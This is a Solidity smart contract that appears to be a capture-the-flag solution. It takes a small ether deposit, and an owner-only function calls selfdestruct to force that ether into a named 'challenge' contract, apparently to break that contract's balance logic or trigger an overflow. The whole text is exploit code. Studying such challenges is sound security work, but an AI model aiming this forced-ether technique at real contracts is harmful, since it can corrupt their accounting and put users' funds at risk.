pragma solidity ^0.8.13;


contract Solution {

    address owner;
    address public challenge;

    constructor(address _contract) payable {
        require(msg.value == 10**15, "Not enough ether.");
        owner = msg.sender;
        challenge = _contract;
    }

    function overflowChallenge() public {
        require(owner == msg.sender, "Not owner");
        selfdestruct(payable(challenge));
    }
}
